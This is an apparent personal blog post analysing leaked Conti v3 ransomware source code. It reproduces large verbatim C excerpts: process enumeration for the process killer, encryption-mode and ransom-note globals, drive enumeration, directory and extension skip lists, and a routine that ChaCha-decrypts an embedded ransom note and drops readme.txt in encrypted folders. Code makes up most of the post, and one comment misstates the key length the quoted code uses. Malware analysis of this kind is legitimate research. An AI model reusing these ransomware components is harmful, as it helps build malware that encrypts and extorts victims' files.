<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="scr1pt"><title>Conti v3 Ransomeware Souce Code Analysis · scr1pt's blog</title><meta name="description" content="prockillermemorySnapshot
pCreateToolhelp32Snapshot
pProcess32FirstW
pProcess32NextW

12345678910111213141516171819202122232425262728293031323334353637"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/scr1pt.jpg"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.1.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/scr1pt.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/scr1pt.jpg" style="width:200px;" alt="favicon"><h3 title=""><a href="/">scr1pt's blog</a></h3><div class="description"><p>my dear virus, please fuck me</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/scr1pt-kid"><i class="fa fa-github"></i></a></li><li><a href="mailto:2466811523@qq.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="http://sighttp.qq.com/authd?IDKEY=2466811523"><i class="fa fa-qq"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> scr1pt</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Conti v3 Ransomeware Souce Code Analysis</a></h3></div><div class="post-content"><p><h2 id="prockiller"><a href="#prockiller" class="headerlink" title="prockiller"></a>prockiller</h2><h3 id="memorySnapshot"><a href="#memorySnapshot" class="headerlink" title="memorySnapshot"></a>memorySnapshot</h3><ul>
<li>pCreateToolhelp32Snapshot</li>
<li>pProcess32FirstW</li>
<li>pProcess32NextW</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;prockiller.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../api/getapi.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../obfuscation/MetaString.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../memory.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">VOID </span><br><span class="line"><span class="title function_">process_killer::GetWhiteListProcess</span><span class="params">(__out PPID_LIST PidList)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapShot == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PROCESSENTRY32W pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32W);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pProcess32FirstW(hSnapShot, &amp;pe32)) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(hSnapShot);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!plstrcmpiW(pe32.szExeFile, OBFW(<span class="string">L&quot;explorer.exe&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">			PPID Pid = (PPID)m_malloc(<span class="keyword">sizeof</span>(PID));</span><br><span class="line">			<span class="keyword">if</span> (!Pid) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Pid-&gt;dwProcessId = pe32.th32ProcessID;</span><br><span class="line">			TAILQ_INSERT_TAIL(PidList, Pid, Entries);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (pProcess32NextW(hSnapShot, &amp;pe32));</span><br><span class="line"></span><br><span class="line">	pCloseHandle(hSnapShot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tagPROCESSENTRY32W</span><br><span class="line">&#123;</span><br><span class="line">    DWORD   dwSize;</span><br><span class="line">    DWORD   cntUsage;</span><br><span class="line">    DWORD   th32ProcessID;          // this process</span><br><span class="line">    ULONG_PTR th32DefaultHeapID;</span><br><span class="line">    DWORD   th32ModuleID;           // associated exe</span><br><span class="line">    DWORD   cntThreads;</span><br><span class="line">    DWORD   th32ParentProcessID;    // this process&#x27;s parent process</span><br><span class="line">    LONG    pcPriClassBase;         // Base priority of process&#x27;s threads</span><br><span class="line">    DWORD   dwFlags;</span><br><span class="line">    WCHAR   szExeFile[MAX_PATH];    // Path</span><br><span class="line">&#125; PROCESSENTRY32W;</span><br></pre></td></tr></table></figure>

<p>szExeFile为进程运行文件路径</p>
</blockquote>
<h3 id="Whitelist"><a href="#Whitelist" class="headerlink" title="Whitelist"></a>Whitelist</h3><p>把进程名不为explorer.exe的进程全都插入到白名单进程列表中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span>	TAILQ_INSERT_TAIL(head, elm, field) do &#123;			\</span></span><br><span class="line"><span class="meta">	TAILQ_NEXT((elm), field) = NULL;				\</span></span><br><span class="line"><span class="meta">	(elm)-&gt;field.tqe_prev = (head)-&gt;tqh_last;			\</span></span><br><span class="line"><span class="meta">	*(head)-&gt;tqh_last = (elm);					\</span></span><br><span class="line"><span class="meta">	(head)-&gt;tqh_last = &amp;TAILQ_NEXT((elm), field);			\</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br></pre></td></tr></table></figure>

<h2 id="global"><a href="#global" class="headerlink" title="global"></a>global</h2><p>set some global parameters,maybe used to build different character sample(extension,mutex…..)</p>
<ul>
<li>Extention</li>
<li>DecryptionNote</li>
<li>EncryptMode<ul>
<li>ALL_ENCRYPT 10</li>
<li>LOCAL_ENCRYPT 11</li>
<li>NETWORK_ENCRYPT 12</li>
<li>BACKUPS_ENCRYPT 13</li>
<li>PATH_ENCRYPT 14</li>
</ul>
</li>
<li>IsProcKillerEnabled</li>
<li>EncryptPath</li>
<li>EncryptSize</li>
<li>MutexName</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">STATIC WCHAR g_Extention[<span class="number">7</span>] = <span class="string">L&quot;.EXTEN&quot;</span>;</span><br><span class="line">STATIC CHAR g_DecryptNote[<span class="number">2048</span>] = <span class="string">&quot;__DECRYPT_NOTE__&quot;</span>;</span><br><span class="line">STATIC INT g_EncryptMode = ALL_ENCRYPT;</span><br><span class="line">STATIC BOOL g_IsProcKillerEnabled = FALSE;</span><br><span class="line">STATIC LPCWSTR g_EncryptPath = <span class="literal">NULL</span>;</span><br><span class="line">STATIC BYTE g_EncryptSize = <span class="number">50</span>;</span><br><span class="line"><span class="comment">//STATIC CHAR g_MutexName[65] = &quot;__MUTEX_NAME__&quot;;</span></span><br><span class="line"></span><br><span class="line">PWCHAR </span><br><span class="line"><span class="title function_">global::GetExtention</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_Extention;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PCHAR </span><br><span class="line"><span class="title function_">global::GetDecryptNote</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_DecryptNote;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PCHAR</span><br><span class="line"><span class="title function_">global::GetMutexName</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//return g_MutexName;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">global::SetEncryptMode</span><span class="params">(INT EncryptMode)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_EncryptMode = EncryptMode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">INT</span><br><span class="line"><span class="title function_">global::GetEncryptMode</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_EncryptMode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">global::SetProcKiller</span><span class="params">(BOOL IsEnabled)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_IsProcKillerEnabled = IsEnabled;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL </span><br><span class="line"><span class="title function_">global::GetProcKiller</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_IsProcKillerEnabled;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VOID </span><br><span class="line"><span class="title function_">global::SetEncryptPath</span><span class="params">(__in LPCWSTR Path)</span></span><br><span class="line">&#123;</span><br><span class="line">	g_EncryptPath = Path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPCWSTR</span><br><span class="line"><span class="title function_">global::GetEncryptPath</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> g_EncryptPath;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL </span><br><span class="line"><span class="title function_">global::SetEncryptSize</span><span class="params">(__in INT Size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (Size != <span class="number">10</span> ||</span><br><span class="line">		Size != <span class="number">15</span> ||</span><br><span class="line">		Size != <span class="number">20</span> ||</span><br><span class="line">		Size != <span class="number">25</span> ||</span><br><span class="line">		Size != <span class="number">30</span> ||</span><br><span class="line">		Size != <span class="number">35</span> ||</span><br><span class="line">		Size != <span class="number">40</span> ||</span><br><span class="line">		Size != <span class="number">45</span> ||</span><br><span class="line">		Size != <span class="number">50</span> ||</span><br><span class="line">		Size != <span class="number">60</span> ||</span><br><span class="line">		Size != <span class="number">70</span> ||</span><br><span class="line">		Size != <span class="number">80</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		g_EncryptSize = <span class="number">50</span>;</span><br></pre></td></tr></table></figure>

<h2 id="logs"><a href="#logs" class="headerlink" title="logs"></a>logs</h2><ul>
<li>va_start</li>
<li>va_arg</li>
<li>va_end</li>
</ul>
<p>The <strong>RtlSecureZeroMemory</strong> routine fills a block of memory with zeros in a way that is guaranteed to be secure.</p>
<h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><blockquote>
<p>init in function main:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPWSTR LogFile = GetCommandLineArg(Argv, Argc, OBFW(<span class="string">L&quot;-log&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (LogFile) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Init(LogFile);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">logs::Init(LPCWSTR LogFile)</span><br><span class="line">&#123;</span><br><span class="line">	pInitializeCriticalSection(&amp;g_CritSec);</span><br><span class="line">	g_LogHandle = pCreateFileW(</span><br><span class="line">		LogFile,</span><br><span class="line">		GENERIC_WRITE,</span><br><span class="line">		FILE_SHARE_READ,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_ALWAYS,</span><br><span class="line">		FILE_FLAG_WRITE_THROUGH,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	pSetFilePointer(g_LogHandle, <span class="number">0</span>, <span class="literal">NULL</span>, FILE_END);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="write"><a href="#write" class="headerlink" title="write"></a>write</h3><p>write some errors.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logs::Write(OBFW(L&quot;FindFirstFile fails in directory %s. GetLastError = %lu.&quot;), CurrentDirectory.c_str(), pGetLastError());</span><br></pre></td></tr></table></figure>

<h2 id="filesystem"><a href="#filesystem" class="headerlink" title="filesystem"></a>filesystem</h2><h3 id="disks"><a href="#disks" class="headerlink" title="disks"></a>disks</h3><ul>
<li>SIZE_T BufferLength &#x3D; (SIZE_T)pGetLogicalDriveStringsW(0, NULL); </li>
<li>pGetLogicalDriveStringsW(BufferLength, Buffer);</li>
</ul>
<blockquote>
<p>GetLogicalDriveStringsW</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD GetLogicalDriveStringsW(</span><br><span class="line">[in]  DWORD  nBufferLength,</span><br><span class="line">[out] LPWSTR lpBuffer</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>If the function succeeds, the return value is the length, in characters, of the strings copied to the buffer, not including the terminating null character. Note that an ANSI-ASCII null character uses one byte, but a Unicode (UTF-16) null character uses two bytes.</p>
<p>If the buffer is not large enough, the return value is greater than <em>nBufferLength</em>. It is the size of the buffer required to hold the drive strings.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;filesystem.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../api/getapi.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../memory.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;../logs/logs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">INT </span><br><span class="line"><span class="title function_">filesystem::EnumirateDrives</span><span class="params">(__in PDRIVE_LIST DriveList)</span></span><br><span class="line">&#123;</span><br><span class="line">	INT Length = <span class="number">0</span>;</span><br><span class="line">	INT DrivesCount = <span class="number">0</span>;</span><br><span class="line">	DWORD DriveType = <span class="number">0</span>;</span><br><span class="line">	TAILQ_INIT(DriveList);</span><br><span class="line"></span><br><span class="line">	SIZE_T BufferLength = (SIZE_T)pGetLogicalDriveStringsW(<span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!BufferLength) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	LPWSTR Buffer = (LPWSTR)m_malloc((BufferLength + <span class="number">1</span>) * <span class="keyword">sizeof</span>(WCHAR));</span><br><span class="line">	<span class="keyword">if</span> (!Buffer) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pGetLogicalDriveStringsW(BufferLength, Buffer);</span><br><span class="line">	</span><br><span class="line">	LPWSTR tempBuffer = Buffer;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (Length = (INT)plstrlenW(tempBuffer)) &#123;</span><br><span class="line"></span><br><span class="line">		PDRIVE_INFO DriveInfo = new DRIVE_INFO;</span><br><span class="line">		<span class="keyword">if</span> (!DriveInfo) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="built_in">free</span>(Buffer);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		DriveInfo-&gt;RootPath = tempBuffer;</span><br><span class="line">		TAILQ_INSERT_TAIL(DriveList, DriveInfo, Entries);</span><br><span class="line"></span><br><span class="line">		DrivesCount++;</span><br><span class="line">		tempBuffer += Length + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	logs::Write(OBFW(<span class="string">L&quot;Found %d drives: &quot;</span>), DrivesCount);</span><br><span class="line"></span><br><span class="line">	PDRIVE_INFO DriveInfo = <span class="literal">NULL</span>;</span><br><span class="line">	TAILQ_FOREACH(DriveInfo, DriveList, Entries) &#123;</span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;%s&quot;</span>), DriveInfo-&gt;RootPath.c_str());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(Buffer);</span><br><span class="line">	<span class="keyword">return</span> DrivesCount;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="search"><a href="#search" class="headerlink" title="search"></a>search</h3><ul>
<li><p>MakeSearchMask</p>
<ul>
<li>used to generate a search mask path</li>
</ul>
</li>
<li><p>MakePath</p>
<ul>
<li>used to generate the file path</li>
</ul>
</li>
<li><p>CheckDirectory</p>
<ul>
<li><p>check if the <code>directory</code> is in the Blacklist, if yes then pass this directory. This is to make sure the system running without breaking.</p>
<ul>
<li>&#96;&#96;&#96;<br>      OBFW(L”tmp”),<br>          OBFW(L”winnt”),<br>          OBFW(L”temp”),<br>          OBFW(L”thumb”),<br>          OBFW(L”$Recycle.Bin”),<br>          OBFW(L”$RECYCLE.BIN”),<br>          OBFW(L”System Volume Information”),<br>          OBFW(L”Boot”),<br>          OBFW(L”Windows”),<br>          OBFW(L”Trend Micro”),<br>          OBFW(L”perflogs”)  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- CheckFilename</span><br><span class="line"></span><br><span class="line">    - check if the `file` is in the Blacklist, if yes then pass this file. This is to make sure the system running without breaking.</span><br><span class="line"></span><br><span class="line">        - ```</span><br><span class="line">            		OBFW(L&quot;.exe&quot;),</span><br><span class="line">                		OBFW(L&quot;.dll&quot;),</span><br><span class="line">                		OBFW(L&quot;.lnk&quot;),</span><br><span class="line">                		OBFW(L&quot;.sys&quot;),</span><br><span class="line">                		OBFW(L&quot;.msi&quot;),</span><br><span class="line">                		OBFW(L&quot;readme.txt&quot;),</span><br><span class="line">                		OBFW(L&quot;CONTI_LOG.txt&quot;),</span><br><span class="line">                		OBFW(L&quot;.bat&quot;)</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
</li>
<li><p>DropInstruction</p>
<ul>
<li>release the reame.txt to every directory that is encrypted by Ransomeware.</li>
<li>the DecryptionNotes is encrypted with chacha<ul>
<li>the first 16 bytes is the key</li>
<li>the 16-20 bytes is the iv</li>
<li>the follow is the encrypted data</li>
</ul>
</li>
</ul>
</li>
<li><p>SearchFiles</p>
</li>
</ul>
<h4 id="DropInstruction"><a href="#DropInstruction" class="headerlink" title="DropInstruction"></a>DropInstruction</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">DropInstruction(__in <span class="built_in">std</span>::<span class="built_in">wstring</span> Directory)</span><br><span class="line">&#123;</span><br><span class="line">	LPCWSTR str = OBFW(<span class="string">L&quot;readme.txt&quot;</span>);</span><br><span class="line">	<span class="built_in">std</span>::<span class="built_in">wstring</span> Filename = MakePath(Directory, str);</span><br><span class="line"></span><br><span class="line">	HANDLE hFile = pCreateFileW(</span><br><span class="line">		Filename.c_str(),</span><br><span class="line">		GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		CREATE_ALWAYS,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD dwDecryptNote = <span class="number">0</span>;</span><br><span class="line">	LPSTR DecryptNote = global::GetDecryptNote();</span><br><span class="line"></span><br><span class="line">	ECRYPT_ctx CryptCtx;</span><br><span class="line">	BYTE ChaChaKey[<span class="number">32</span>];</span><br><span class="line">	BYTE ChaChaIV[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(ChaChaKey, DecryptNote, <span class="number">32</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(ChaChaIV, DecryptNote + <span class="number">32</span>, <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(&amp;dwDecryptNote, DecryptNote + <span class="number">40</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">	LPSTR DecryptNotePlainText = (LPSTR)m_malloc(dwDecryptNote);</span><br><span class="line">	<span class="keyword">if</span> (!DecryptNotePlainText) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(hFile);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	RtlSecureZeroMemory(&amp;CryptCtx, <span class="keyword">sizeof</span>(CryptCtx));</span><br><span class="line">  ECRYPT_keysetup(&amp;CryptCtx, ChaChaKey, <span class="number">256</span>, <span class="number">64</span>);</span><br><span class="line">	ECRYPT_ivsetup(&amp;CryptCtx, ChaChaIV);</span><br><span class="line"></span><br><span class="line">	ECRYPT_decrypt_bytes(&amp;CryptCtx, (PBYTE)DecryptNote + <span class="number">44</span>, (PBYTE)DecryptNotePlainText, dwDecryptNote);</span><br><span class="line"></span><br><span class="line">	DWORD BytesWritten;</span><br><span class="line">	pWriteFile(hFile, DecryptNotePlainText, dwDecryptNote, &amp;BytesWritten, <span class="literal">NULL</span>);</span><br><span class="line">	pCloseHandle(hFile);</span><br><span class="line">	RtlSecureZeroMemory(DecryptNotePlainText, dwDecryptNote);</span><br><span class="line">	<span class="built_in">free</span>(DecryptNotePlainText);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

